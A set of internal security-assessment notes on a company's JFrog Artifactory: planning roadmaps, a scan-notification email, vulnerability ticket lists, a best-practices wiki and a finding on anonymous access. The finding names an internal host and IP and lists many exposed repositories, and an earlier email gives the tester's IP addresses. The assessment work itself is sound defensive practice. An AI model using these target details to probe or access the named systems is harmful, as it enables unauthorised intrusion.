

---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Threat Model Kick-Off.md
---

## PrjName | Threat Model

Team,

Hope all is well  —  Setting up some time to go over the following [threat model](https://wiki.corp.adobe.com/pages/viewpage.action?pageId=3133167284 "https://wiki.corp.adobe.com/pages/viewpage.action?pageId=3091523595"). Feel free to include anyone else from the team who would be able to help us through the process.

Lastly, let me know if the time doesn't work for you and if you have any questions comments or concerns!


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Resources/Artifactory Access - Scan Email  Alert - PASS-20309.md
---

To: Adobe Soc Shared <socshared@adobe.com>; 
cc: ORG-LSTROPE-ALL <ORG-LSTROPE-ALL@adobe.com>; Security Coordination Center <scc@adobe.com>; Adobe PSIRT <psirt@adobe.com>

---

**Subject:** Notification of Scheduled Security Scan | PASS-20309

**Dear SOC Team,**

I hope this message finds you well. I am writing to inform you that I will be conducting a security scan of an Application. This is part of the [PASS-20309](https://jira.corp.adobe.com/browse/PASS-20309) security review. The details of the scan are as follows:

- **Date and Time:** [Insert Date and Time]
- **Duration:** [Estimated Duration]
- **Scope:** [Specify the systems, networks, or applications being scanned]
- **Purpose:** [Briefly explain the reason for the scan, e.g., routine check, vulnerability assessment, compliance requirement]

Please be aware that during this time, there may be increased network activity and potential alerts generated by the scan. I will monitor the scan closely and address any issues that arise. Information on the machine running the scan are as following:

- **Hostname:** `Darwin Gilless-MacBook-Pro.local 24.3.0 Darwin Kernel Version 24.3.0: Thu Jan  2 20:24:23 PST 2025; root:xnu-11215.81.4~3/RELEASE_ARM64_T6031 arm64`
- VM: `Linux gbiagomba-kali 6.12.13-arm64 #1 SMP Kali 6.12.13-1kali1 (2025-02-11) aarch64 GNU/Linux`
- **IPv4:** `76.124.72.139`
- **IPv6:** `2601:47:4d80:a290:a9e5:2097:a9f2:2035`
- **Tool(s):** Burp, Nmap, Metasploit, OpenVAS, etc.

If you have any questions or need further information, please do not hesitate to contact me.

Thank you for your attention to this matter.

Best regards.


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Resources/Artifactory Audit Roadmap Development 1.md
---

To build a comprehensive project roadmap for your Artifactory audit, I'll break it down into key phases and tasks to help address both the technical aspects and the business context. This will ensure you cover external repositories, anonymous access, product usage, and the Jenkins-Artifactory integration. Here's a detailed roadmap:

### 1. **Environment Discovery and Mapping**
   - **Objective**: Gain a full understanding of the Artifactory environment, including its integrations and configurations.
   - **Tasks**:
     - **Inventory repositories**: Document all the repositories currently in the system (both local and remote).
     - **Identify product dependencies**: Work with product teams to map which products or services are using Artifactory.
     - **Jenkins Integration Analysis**:
       - Review Jenkins pipelines to see how Artifactory is used (artifact publishing, dependency fetching, etc.).
       - Understand the flow of build artifacts and dependency management between Jenkins and Artifactory.
     - **Security audit of external exposure**: Use Burp and Greenbone OpenVAS to identify edge exposure, but supplement this by manually investigating firewall, network segmentation, and IAM configurations that secure Artifactory from internal threats.

### 2. **Repository Management & Team Practices**
   - **Objective**: Understand how external repositories are added and governed.
   - **Tasks**:
     - **Policy review**: Investigate internal policies around adding external repositories. Do teams have unrestricted access, or is there a governance process?
     - **Access audit**: Review who has the ability to add repositories and ensure it's limited to authorized personnel.
     - **Repository provenance**: Ensure external repositories are coming from trusted sources, and evaluate whether there are security reviews for these external connections.

### 3. **Anonymous Access Use Cases**
   - **Objective**: Identify and assess the need for anonymous access within Artifactory.
   - **Tasks**:
     - **Usage discovery**: Identify repositories or services using anonymous access and check the logs to see who is accessing them.
     - **Business justification**: Meet with business stakeholders to understand why anonymous access is required (e.g., public distribution of libraries, open-source projects).
     - **Risk assessment**: Evaluate the risks associated with anonymous access (e.g., data leaks, repository tampering) and ensure that usage is justified and documented.

### 4. **Vulnerability and Risk Assessment**
   - **Objective**: Identify potential security risks in Artifactory usage, both internal and external.
   - **Tasks**:
     - **Edge security**: Validate findings from Burp and Greenbone scans, addressing vulnerabilities.
     - **Internal risk discovery**: Audit role-based access control (RBAC), API key usage, and secrets management within Artifactory. Focus on over-provisioned users or excessive permissions.
     - **Business impact assessment**: Work with business teams to evaluate the impact of Artifactory outages, security breaches, or supply chain attacks on business operations.

### 5. **Jenkins and Artifactory Pipeline Governance**
   - **Objective**: Review how Jenkins pipelines interact with Artifactory to ensure best practices in artifact management.
   - **Tasks**:
     - **Artifact retention and purging policies**: Ensure that pipelines are configured to clean up unused artifacts to prevent storage bloat and unnecessary costs.
     - **Access control**: Review Jenkins' access to Artifactory, ensuring the least privilege principle is applied for build agents and service accounts.
     - **Audit logging and traceability**: Ensure proper logging of actions from Jenkins within Artifactory for traceability of who is publishing or pulling artifacts.

### 6. **Internal Blind Spot Identification**
   - **Objective**: Address areas where business context or internal risks are not fully visible.
   - **Tasks**:
     - **Cross-team collaboration**: Meet with stakeholders from different teams (product development, security, DevOps) to gather insights into undocumented or overlooked risks.
     - **Supply chain analysis**: Consider potential supply chain attacks and how external dependencies brought into Artifactory might introduce vulnerabilities.
     - **Incident response planning**: Ensure there are clear incident response plans for security breaches involving Artifactory, including fallback options for critical builds or artifact distribution.

### 7. **Recommendations & Remediation Planning**
   - **Objective**: Provide actionable recommendations based on findings.
   - **Tasks**:
     - **Policy updates**: Recommend updates to repository governance, access control, and anonymous access policies.
     - **Risk mitigation**: Outline steps to mitigate the discovered risks, including internal process improvements, enhanced monitoring, and tighter access controls.
     - **Ongoing monitoring**: Propose monitoring solutions or regular audit cycles to maintain a secure environment.

---

By following this roadmap, you'll ensure a holistic audit that not only uncovers technical vulnerabilities but also addresses business risks and blind spots in Artifactory’s use within the organization. Would you like more specific details for any of these phases?


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Resources/testssl.md
---

### Steps to Fix the Issue

1. **Review Resource Requirements**: Identify all the resources (scripts, styles, images, etc.) that your application needs to load.
    
2. **Adjust CSP Header**: Modify the CSP header to allow these resources. For example, if your application needs to load scripts from a specific domain, you can update the CSP header like this:
    
    ```nginx
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://artifactory-stg.corp.adobe.com";
    ```
    
3. **Test Incrementally**: Gradually add the necessary sources to the CSP header and test the UI after each change to ensure it works correctly.
    
4. **Use Report-Only Mode**: You can use the `Content-Security-Policy-Report-Only` header to test the policy without enforcing it. This way, you can see what would be blocked without actually blocking it:
    
    ```nginx
    add_header Content-Security-Policy-Report-Only "default-src 'self'; script-src 'self' https://artifactory-stg.corp.adobe.com";
    ```
    

By carefully adjusting the CSP header and testing, you can find a balance between security and functionality. If you need further assistance with specific resources or configurations, feel free to ask!


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Resources/Project Status.md
---

## Security Assessment Phase
- Initial Kick Off <span style="color:green">[Completed]</span>
- Code Review  <span style="color:blue">[Skipped]</span>
- Architectural Design Review  <span style="color:blue">[Skipped]</span>
- Network & WebApp Security Review<span style="color:green">[Completed]</span>
- Testing & Documentation <span style="color:yellow">[In-Progress]</span>
- Reporting & Ticketing <span style="color:blue">[Skipped]</span>
## Security Threats Identified
1. [UDVT-3851 - Artifactory Access - Artifactory Anonymous Access - High (8.2)](https://jira.corp.adobe.com/browse/UDVT-3851)
2. [UDVT-3852 - Artifactory Access - Cross Site Request Forgery (XSRF) - Medium (6.3)](https://jira.corp.adobe.com/browse/UDVT-3852)
3. [UDVT-3853 - Artifactory Access - HSTS Security Misconfiguration - Medium (6.5)](https://jira.corp.adobe.com/browse/UDVT-3853)
4. [UDVT-3854 - Artifactory Access - Outdated Vulnerable Software - Dell EMC Open Manage Server Administrator - High (7.8)](https://jira.corp.adobe.com/browse/UDVT-3854)
5. [UDVT-3855 - Artifactory Access - Outdated Vulnerable Software - DOMPurify - Medium (6.1)](https://jira.corp.adobe.com/browse/UDVT-3855)
6. [UDVT-3856 - Artifactory Access - Outdated Vulnerable Software - JFrog Artifactory - Critical (9.3)](https://jira.corp.adobe.com/browse/UDVT-3856)
7. [UDVT-3857 - Artifactory Access - Outdated Vulnerable Software - Medium (4.8)](https://jira.corp.adobe.com/browse/UDVT-3857)
8. [UDVT-3858 - Artifactory Access - Outdated Vulnerable Software - nginx - High (7.8)](https://jira.corp.adobe.com/browse/UDVT-3858)
9. [UDVT-3859 - Artifactory Access - Outdated Vulnerable Software - Vue.js - Medium (4.8)](https://jira.corp.adobe.com/browse/UDVT-3859)
## Questions/Comments:
- ATS opposes moving forward, citing impacts on ethos and digital governance.
- We will be making a best practices wiki & documenting all of our findings
- We are pushing to close the anonymous deployment vulnerability


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Resources/Artifactory Audit Roadmap Development.md
---

To build a comprehensive project roadmap for your Artifactory audit, we need to address several key areas: security, business processes, team behaviors, and system integrations. Below is a roadmap framework that you can adapt based on your specific context.

### **1. Environment Discovery and Mapping**
   - **Goal:** Fully understand the Artifactory environment, its integrations, and usage patterns.
   - **Tasks:**
     - **Identify repositories:** Audit all current external repositories connected to Artifactory (external feeds, package managers).
     - **Repository creation process:** Investigate how teams add new repositories—what permissions and controls are in place.
     - **Use of anonymous access:** Identify why and how anonymous access is used. Investigate its business necessity and the risks it poses.
     - **Product/service dependencies:** Map out which products (internal/external) rely on Artifactory for storage, builds, or deployment pipelines.
     - **Risk blind spots:** Collaborate with teams to identify risks that may not be apparent from a technical scan (e.g., business workflows, contractual obligations).

### **2. Security Scanning and Testing**
   - **Goal:** Conduct comprehensive security scans beyond just edge detection.
   - **Tasks:**
     - **Vulnerability scanning:** Continue scans using Burp and Greenbone OpenVAS for edge vulnerabilities. Supplement with deeper scans of internal repositories and connected systems.
     - **Repository-specific vulnerabilities:** Use tools like JFrog Xray or dependency-checker for internal vulnerability scanning (e.g., outdated packages, known CVEs).
     - **Access and authorization reviews:** Examine access control policies (e.g., anonymous, role-based access). Focus on overly permissive access.
     - **Auditing logs and activity:** Review system logs and user activity for any unusual patterns. This can help uncover internal risks such as unauthorized repository additions or policy bypasses.

### **3. Use Case Review and Business Context**
   - **Goal:** Align technical audit findings with the business context to identify risks that could impact operations.
   - **Tasks:**
     - **Anonymous access use cases:** Consult with stakeholders (e.g., product teams, DevOps) to understand why anonymous access is used. Is it for public access to open-source projects or for internal convenience? Evaluate the risk versus the business value.
     - **External repo additions:** Investigate the business justification for adding external repositories (third-party libraries, speed of development). Ensure there's a documented approval process.
     - **Review CI/CD pipelines:** Examine how Artifactory integrates with CI/CD systems (Jenkins, GitLab CI, etc.). Identify any vulnerabilities in these integrations.
     - **Business-critical systems:** Identify the products or services that rely on Artifactory, especially those directly impacting business revenue or customer satisfaction.

### **4. Internal Risk Identification**
   - **Goal:** Understand internal risks, including misconfigurations, unapproved access, or data leakage risks.
   - **Tasks:**
     - **Misconfigurations:** Review Artifactory configuration for misconfigured security settings (e.g., default credentials, insecure endpoints).
     - **Permissions audit:** Perform a full audit of permissions across repositories, focusing on non-essential permissions for external and internal users.
     - **Data leakage risks:** Investigate potential risks of sensitive data being leaked via Artifactory (e.g., accidentally pushing secrets to a public repository).
     - **Dev team practices:** Interview teams to understand their development practices, and whether they follow secure development principles (e.g., proper use of credentials, scanning dependencies).

### **5. Governance and Policy Alignment**
   - **Goal:** Ensure that your Artifactory usage aligns with organizational security policies and compliance standards.
   - **Tasks:**
     - **Policy review:** Ensure that repository usage and access controls are aligned with internal security policies and any external regulations (e.g., GDPR, SOX).
     - **Approval workflows:** Ensure that there is a formal process for adding new repositories, including security reviews and approvals.
     - **Monitor compliance:** Develop or implement automated checks to enforce security policies in Artifactory (e.g., scanning new repositories for vulnerabilities before allowing use).
     - **Business impact analysis:** Review how Artifactory disruptions (e.g., downtime, breaches) could affect business operations. Include this in your risk assessment.

### **6. Risk Mitigation and Remediation**
   - **Goal:** Prioritize and remediate the risks found during the audit.
   - **Tasks:**
     - **Anonymous access:** Based on your findings, either justify the need for anonymous access or disable/restrict it.
     - **Repository risk management:** Implement a whitelist or approval system for external repositories to minimize exposure to risky or malicious content.
     - **Vulnerability remediation:** Patch or remove any identified vulnerabilities in the environment (repos, packages, integrations).
     - **Monitoring and alerts:** Set up continuous monitoring and automated alerts for suspicious activity or new vulnerabilities in Artifactory.

### **7. Reporting and Documentation**
   - **Goal:** Ensure findings are well-documented for internal use and audit trail.
   - **Tasks:**
     - **Audit report:** Prepare a report summarizing the key risks, vulnerabilities, and business impacts identified during the audit.
     - **Risk register:** Maintain a risk register with clear risk ratings, potential impacts, and action items for mitigation.
     - **Compliance documentation:** Ensure documentation is available for any compliance audits or certifications required (e.g., ISO, SOC 2).
     - **Stakeholder briefings:** Prepare presentations or documentation to communicate your findings to executives or relevant stakeholders, with recommendations for next steps.

This roadmap will help you uncover the blind spots in your Artifactory environment by focusing both on technical security measures and understanding the business implications of your findings.


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Resources/Task List.md
---

Search metasploit/nvd for these
```
cpe:/a:dell:emc_openmanage_server_administrator:11.0.0.0
cpe:/a:f5:nginx:1.20.2
cpe:/a:f5:nginx:1.22.1
cpe:/a:ietf:secure_shell_protocol:2.0
cpe:/a:ietf:transport_layer_security:1.0
cpe:/a:ietf:transport_layer_security:1.1
cpe:/a:ietf:transport_layer_security:1.2
cpe:/a:ietf:transport_layer_security:1.3
cpe:/a:jfrog:artifactory:7.63.22
cpe:/a:nginx:nginx:1.20.2
cpe:/a:nginx:nginx:1.22.1
cpe:/a:openbsd:openssh:8.0
```

Run the following:
- [ ] Nuclei
- [ ] ZAP
- [ ] Sherlock tools



---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Artifactory x Jenking.md
---

## Highlights
- Deprecating 60% of jenkins jobs next yer
- Moving to GitHub Actions
	- Security is responsible for best practices
- Jenkins teams is responsible for managing their own hosts
- Each team has their own jenkins build
	- DX team uses monolith jenkins
	- Teams can disable security thru Boolean function
- 
## Action Items:
- 


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Wiki/Artifactory Access - JFrog Artifactory Best Practices - Wiki Presentation.md
---

Here's a formatted version of the JFrog Artifactory best practices for a presentation:

---

**Slide 1: Title Slide**

- **Title:** JFrog Artifactory Best Practices
- **Subtitle:** Ensuring Security and Efficiency
- **Your Name**
- **Date**

---

**Slide 2: Introduction**

- **Introduction to JFrog Artifactory**
    - Universal artifact repository manager
    - Central hub for storing, managing, and distributing software artifacts

---

**Slide 3: Security Best Practices**

- **1. Disable Anonymous Access**
    - Log in to the administration console
    - Navigate to 'Admin' > 'Security' > 'General'
    - Disable 'Allow Anonymous Access'
    - Save changes

---

**Slide 4: Implement Role-Based Access Control (RBAC)**

- **Steps:**
    - Define roles for different user groups
    - Assign appropriate permissions to each role
    - Regularly review and update permissions

---

**Slide 5: Enable Logging and Monitoring**

- **Steps:**
    - Configure Artifactory to log all access and actions
    - Set up alerts for suspicious activities
    - Regularly review logs

---

**Slide 6: Use Signed Artifacts**

- **Steps:**
    - Configure Artifactory to require signed artifacts
    - Validate signatures during deployment
    - Reject unsigned or improperly signed artifacts

---

**Slide 7: Secure API Access**

- **Steps:**
    - Use API tokens or keys for authentication
    - Limit the scope of API tokens
    - Regularly rotate API tokens and keys

---

**Slide 8: Regularly Update Artifactory**

- **Steps:**
    - Subscribe to security advisories and release notes
    - Schedule regular maintenance windows
    - Test updates in a staging environment

---

**Slide 9: Implement Network Segmentation**

- **Steps:**
    - Place Artifactory in a dedicated subnet
    - Use firewalls to restrict access
    - Implement VPN access for remote users

---

**Slide 10: Use HTTPS for Secure Communication**

- **Steps:**
    - Configure Artifactory to use HTTPS
    - Obtain and install a valid SSL/TLS certificate
    - Regularly renew and update the certificate

---

**Slide 11: Enforce Strong Authentication Mechanisms**

- **Steps:**
    - Use multi-factor authentication (MFA)
    - Enforce strong password policies
    - Regularly review and disable inactive user accounts

---

**Slide 12: Conduct Regular Security Audits**

- **Steps:**
    - Schedule regular internal and external audits
    - Use automated security scanning tools
    - Review audit findings and implement mitigations

---

**Slide 13: Backup and Disaster Recovery**

- **Steps:**
    - Regularly back up data and configurations
    - Store backups in a secure, offsite location
    - Test disaster recovery plan

---

**Slide 14: Limit Access to Sensitive Data**

- **Steps:**
    - Use encryption for sensitive data at rest
    - Implement access controls
    - Regularly review access logs

---

**Slide 15: Secure Repository Configuration**

- **Steps:**
    - Disable unused repositories
    - Use repository replication
    - Implement cleanup policies

---

**Slide 16: Monitor and Respond to Security Incidents**

- **Steps:**
    - Set up real-time monitoring and alerting
    - Develop an incident response plan
    - Conduct regular incident response drills

---

**Slide 17: Recent Security Findings**

- **Anonymous Access Vulnerability**
    - Impact and Mitigation
- **Anonymous Deployment Vulnerability**
    - Impact and Mitigation
- **User Enumeration Vulnerability**
    - Impact and Mitigation

---

**Slide 18: Conclusion**

- **Summary of Best Practices**
- **Importance of Regular Reviews and Updates**

---

### 2. Tools to Implement These Practices

Here are some tools that can help implement these best practices:

- **JFrog Xray:** For security scanning and vulnerability detection.
- **JFrog Mission Control:** For managing multiple Artifactory instances.
- **JFrog Access Federation:** For centralized user and permission management.
- **Splunk or ELK Stack:** For logging and monitoring.
- **Let's Encrypt or other SSL providers:** For obtaining SSL/TLS certificates.
- **HashiCorp Vault:** For managing API tokens and secrets.
- **Nagios or Prometheus:** For real-time monitoring and alerting.
- **AWS Backup or similar services:** For backup and disaster recovery.
- **OWASP ZAP or Burp Suite:** For conducting security audits.

### 3. Review Frequency

It is recommended to review these best practices:

- **Quarterly:** To ensure that all security measures are up-to-date and effective.
- **After Major Updates:** Whenever there is a significant update to Artifactory or related infrastructure.
- **After Security Incidents:** To address any vulnerabilities or gaps identified during the incident.
- **Annually:** As part of a comprehensive security audit and review process.

Regular reviews help ensure that your Artifactory instance remains secure and efficient, adapting to new threats and changes in your environment.

  
References

[1] [Best Practices for Structuring and Naming Artifactory Repositories - JFrog](https://jfrog.com/whitepaper/best-practices-structuring-naming-artifactory-repositories/)

[2] [Best Practices for Managing Your Artifactory Filestore - JFrog](https://jfrog.com/whitepaper/best-practices-for-managing-your-artifactory-filestore-2/)

[3] [What is a Software Artifacts Repository? Best Practices - JFrog](https://jfrog.com/learn/devops/software-artifact-repository/)

[4] [Best Practices for Managing Your Artifactory Database - JFrog](https://jfrog.com/whitepaper/best-practices-for-managing-your-artifactory-database/)


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Wiki/Artifactory Access - JFrog Artifactory Best Practices - Wiki.md
---

Sure! Here is a comprehensive write-up for your JFrog Artifactory best practices wiki, including detailed steps for each recommendation:

---

# JFrog Artifactory Best Practices

## Introduction

JFrog Artifactory is a universal artifact repository manager that serves as a central hub for storing, managing, and distributing software artifacts. To ensure the security and efficiency of your Artifactory instance, it is essential to follow best practices. This document outlines key best practices for managing and securing your Artifactory instance, incorporating recent security findings.

## Security Best Practices

### 1. Disable Anonymous Access

Anonymous access to Artifactory can expose sensitive information about your repositories and allow unauthorized actions. To mitigate this risk:

1. **Log in to the JFrog Artifactory administration console.**
2. **Navigate to 'Admin' > 'Security' > 'General'.**
3. **Disable the 'Allow Anonymous Access' option.**
4. **Save the changes.**

### 2. Implement Role-Based Access Control (RBAC)

Ensure that only authorized users have access to specific repositories and actions by implementing RBAC:

1. **Define roles for different user groups (e.g., developers, devops).**
2. **Assign appropriate permissions to each role.**
3. **Regularly review and update permissions to reflect changes in team structure and responsibilities.**

### 3. Enable Logging and Monitoring

Enable logging and monitoring of repository activity to detect unusual uploads and access patterns:

1. **Configure Artifactory to log all access and actions.**
2. **Set up alerts for suspicious activities, such as large numbers of failed login attempts or unexpected uploads.**
3. **Regularly review logs to identify potential security incidents.**

### 4. Use Signed Artifacts

Implement signed artifacts and enforce artifact validation to ensure their integrity before deployment:

1. **Configure Artifactory to require signed artifacts.**
2. **Validate signatures during the deployment process.**
3. **Reject any unsigned or improperly signed artifacts.**

### 5. Secure API Access

Restrict access to the Artifactory API to authorized users and applications:

1. **Use API tokens or keys for authentication.**
2. **Limit the scope of API tokens to the minimum necessary permissions.**
3. **Regularly rotate API tokens and keys.**

### 6. Regularly Update Artifactory

Ensure that your Artifactory instance is always running the latest version to benefit from security patches and new features:

1. **Subscribe to JFrog's security advisories and release notes.**
2. **Schedule regular maintenance windows to apply updates.**
3. **Test updates in a staging environment before deploying them to production.**

### 7. Implement Network Segmentation

Isolate your Artifactory instance from other parts of your network to limit the impact of potential security breaches:

1. **Place Artifactory in a dedicated subnet.**
2. **Use firewalls to restrict access to Artifactory from only trusted IP addresses.**
3. **Implement VPN access for remote users.**

### 8. Use HTTPS for Secure Communication

Encrypt all communications with your Artifactory instance to protect data in transit:

1. **Configure Artifactory to use HTTPS.**
2. **Obtain and install a valid SSL/TLS certificate.**
3. **Regularly renew and update the certificate.**

### 9. Enforce Strong Authentication Mechanisms

Strengthen the authentication process to prevent unauthorized access:

1. **Use multi-factor authentication (MFA) for all users.**
2. **Enforce strong password policies (e.g., minimum length, complexity requirements).**
3. **Regularly review and disable inactive user accounts.**

### 10. Conduct Regular Security Audits

Perform periodic security assessments to identify and address vulnerabilities:

1. **Schedule regular internal and external security audits.**
2. **Use automated security scanning tools to detect vulnerabilities.**
3. **Review audit findings and implement recommended mitigations.**

### 11. Backup and Disaster Recovery

Ensure that you have a robust backup and disaster recovery plan in place:

1. **Regularly back up your Artifactory data and configurations.**
2. **Store backups in a secure, offsite location.**
3. **Test your disaster recovery plan to ensure it works as expected.**

### 12. Limit Access to Sensitive Data

Restrict access to sensitive data stored in Artifactory to only those who need it:

1. **Use encryption to protect sensitive data at rest.**
2. **Implement access controls to limit who can view or modify sensitive data.**
3. **Regularly review access logs to detect unauthorized access attempts.**

### 13. Secure Repository Configuration

Ensure that your repository configurations follow security best practices:

1. **Disable unused repositories to reduce the attack surface.**
2. **Use repository replication to ensure data availability and integrity.**
3. **Implement repository cleanup policies to remove outdated or unused artifacts.**

### 14. Monitor and Respond to Security Incidents

Establish a process for monitoring and responding to security incidents:

1. **Set up real-time monitoring and alerting for security events.**
2. **Develop an incident response plan that outlines steps to take in case of a security breach.**
3. **Conduct regular incident response drills to ensure your team is prepared.**

## Tools to Implement These Practices

Here are some tools that can help implement these best practices:

- **JFrog Xray:** For security scanning and vulnerability detection.
- **JFrog Mission Control:** For managing multiple Artifactory instances.
- **JFrog Access Federation:** For centralized user and permission management.
- **Splunk or ELK Stack:** For logging and monitoring.
- **HashiCorp Vault:** For managing API tokens and secrets.
- **Nagios or Prometheus:** For real-time monitoring and alerting.
- **AWS Backup or similar services:** For backup and disaster recovery.

## Recent Security Findings

### Anonymous Access Vulnerability

During a security review, it was discovered that anonymous access was allowed to the Artifactory instance. This vulnerability allows unauthenticated users to query the API and fetch all repositories, exposing sensitive information such as repository URLs, descriptions, and types.

#### Impact

If exploited, this vulnerability can lead to data breaches, intellectual property theft, and disruption of software development and deployment processes. Attackers can gain insights into the organization's software development and deployment processes and potentially download or tamper with artifacts.

#### Mitigation

To mitigate this vulnerability, disable anonymous access as described in the security best practices section.

### Anonymous Deployment Vulnerability

Another critical finding was that anonymous users were allowed to deploy files to the Artifactory instance. This presents a significant security risk as attackers could upload malicious artifacts, leading to the distribution of compromised components.

#### Impact

If exploited, this vulnerability can compromise the integrity of the software supply chain, resulting in data breaches, unauthorized access, and denial of service.

#### Mitigation

To mitigate this vulnerability, disable anonymous deployments and configure repository permissions to restrict file deployment to authenticated users with appropriate roles.

### User Enumeration Vulnerability

A medium-risk vulnerability was identified where anonymous users could enumerate active users who have deployed artifacts by leveraging the "Deployed By" value of artifacts.

#### Impact

If exploited, this vulnerability can lead to user profiling and targeted attacks such as spear-phishing or brute-force attempts.

#### Mitigation

To mitigate this vulnerability, restrict access to the "Deployed By" field so that only administrators can view it. Additionally, limit anonymous users' ability to access any metadata associated with artifacts.

## Conclusion

By following these best practices and addressing the identified security vulnerabilities, you can significantly enhance the security and efficiency of your JFrog Artifactory instance. Regularly review and update your security measures to stay ahead of potential threats.

---

Feel free to adjust or expand on any sections as needed! If you have any specific requirements or additional information to include, let me know.


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Wiki/Artifactory Access - Artifactory - CoPilot.md
---

**NOTE: THIS IS FOR COPILOT CONSUMPTION - DO NOT CUT THIS TICKET**
# Risk: High (8.2)
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`

**Explanation:** This score is based on the fact that the vulnerability allows unauthenticated users to access sensitive information about the repositories. The attack vector is network-based (AV:N), the attack complexity is low (AC:L), no privileges are required (PR:N), and no user interaction is needed (UI:N). The scope is unchanged (S:U), and the impact on confidentiality is high, integrity is low, and there is no availability lost, as this is a sensitive information disclosure vulnerability (C:H/I:L/A:N).

Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Executive Summary
During a security review of JFrog Artifactory, it was discovered that anonymous access is allowed to the Artifactory instance. This means that any unauthenticated user can query the API and fetch all the repositories. JFrog Artifactory is a universal artifact repository manager, serving as a central hub for storing, managing, and distributing software artifacts like binaries, packages, and containers. The presence of anonymous access poses a significant security risk as it exposes sensitive information about the repositories to potential attackers.

## Detailed Finding
While performing a security assessment of `Artifactory`, we observed the noted web app had allowed anonymous access to its repositories. This means that any unauthenticated user can query the API and retrieve information about all available repositories. The presence of anonymous access is a critical security vulnerability as it exposes sensitive information about the repositories, including their URLs, descriptions, and types. This information can be leveraged by attackers to gain insights into the organization's software development and deployment processes. Additionally, it increases the risk of unauthorized access to the artifacts stored in these repositories.

## Impact:
If an attacker leverages this vulnerability, they can gain unauthorized access to sensitive information about the repositories hosted in JFrog Artifactory. This includes details such as repository URLs, descriptions, and types. With this information, attackers can potentially download or tamper with the artifacts stored in these repositories, leading to data breaches, intellectual property theft, and disruption of software development and deployment processes. Furthermore, attackers can use this information to launch targeted attacks against the organization, compromising its security posture.

# Affected Assets:
## Affected Host(s):
- 10.40.102.10 (artifactory-no1.corp.adobe.com) [443/tcp]

## Affected Repo(s):
```
- cargo-axle-release-local
- cargo-axle-release-no1
- cargo-axle-release-or1
- cargo-axle-release-sj1
- cargo-cai-local
- cargo-cai-no1
- cargo-cai-or1
- cargo-cai-sj1
- debian-edr-release-local
- debian-edr-release-no1
- debian-edr-release-or1
- debian-edr-release-sj1
- docker2-ipaas-public-local
- docker2-mcba-prod-local
- generic-DI-binary-local
- generic-adobesearch-cas-release-local
- generic-campaign-artifacts-dev-local
- generic-creative-cloud-release-local
- generic-creative-cloud-release-no1
- generic-creative-cloud-release-or1
- generic-creative-cloud-release-sj1
- generic-dibr-integration-test-local
- generic-dibr-integration-test-no1
- generic-dibr-integration-test-or1
- generic-dibr-integration-test-sj1
- generic-dilab-binary-local
- generic-dilab-binary-no1
- generic-dilab-binary-or1
- generic-dilab-binary-sj1
- generic-dva-pie-release-local
- generic-dva-pie-release-no1
- generic-dva-pie-release-or1
- generic-dva-pie-release-sj1
- generic-edr-release-local
- generic-edr-release-no1
- generic-edr-release-or1
- generic-edr-release-sj1
- generic-express-pdf-noida-dc-test-local
- generic-express-pdf-noida-dc-test-no1
- generic-express-pdf-noida-dc-test-or1
- generic-express-pdf-noida-dc-test-sj1
- generic-gauntlet-jenkins-update-site-release-local
- generic-mirror-qebasel-release-local
- generic-oracle-java-local
- generic-pca-release-local
- generic-xeng-srpm-release-local
- maven-adobe-oac-automation-release-local
- maven-adobe-oac-automation-release-no1
- maven-adobe-oac-automation-release-or1
- maven-adobe-oac-automation-release-sj1
- maven-adobe-oac-automation-snapshot-local
- maven-adobe-oac-automation-snapshot-no1
- maven-adobe-oac-automation-snapshot-or1
- maven-adobe-oac-automation-snapshot-sj1
- maven-apo-core-release-local
- maven-apo-core-release-no1
- maven-apo-core-release-or1
- maven-apo-core-release-sj1
- maven-di-build-utils-release-local
- maven-ps-android-dependencies-release-local
- npm-adobe-release-local
- npm-analytics-release-local
- npm-coralui-local
- npm-dunamis-release-local
- npm-react-release-local
- pypi-acromon-release-local
- pypi-acromon-release-no1
- pypi-acromon-release-or1
- pypi-acromon-release-sj1
- pypi-adsi-dev-local
- pypi-adsi-dev-no1
- pypi-adsi-dev-or1
- pypi-adsi-dev-sj1
- pypi-car-team-dev-local
- pypi-car-team-dev-no1
- pypi-car-team-dev-or1
- pypi-car-team-dev-sj1
- pypi-deltadataloaders-dev-local
- pypi-deltadataloaders-dev-no1
- pypi-deltadataloaders-dev-or1
- pypi-deltadataloaders-dev-sj1
- pypi-dibr-sandbox-release-local
- pypi-dibr-sandbox-release-no1
- pypi-dibr-sandbox-release-or1
- pypi-dibr-sandbox-release-sj1
- pypi-dibr-tools-dev-local
- pypi-gentech-tools-release-local
- pypi-gentech-tools-release-no1
- pypi-gentech-tools-release-or1
- pypi-gentech-tools-release-sj1
- pypi-hsdw-release-local
- pypi-hsdw-release-no1
- pypi-hsdw-release-or1
- pypi-hsdw-release-sj1
- pypi-identity-ethos-common-release-local
- pypi-identity-ethos-common-release-no1
- pypi-identity-ethos-common-release-or1
- pypi-identity-ethos-common-release-sj1
- pypi-onnx-tool-dev-local
- pypi-onnx-tool-dev-no1
- pypi-onnx-tool-dev-or1
- pypi-onnx-tool-dev-sj1
- pypi-pdfsky-dev-local
- pypi-pdfsky-dev-no1
- pypi-pdfsky-dev-or1
- pypi-pdfsky-dev-sj1
- pypi-releng-local
- pypi-smi-statstracker-ingester-release-local
- pypi-smi-statstracker-ingester-release-no1
- pypi-smi-statstracker-ingester-release-or1
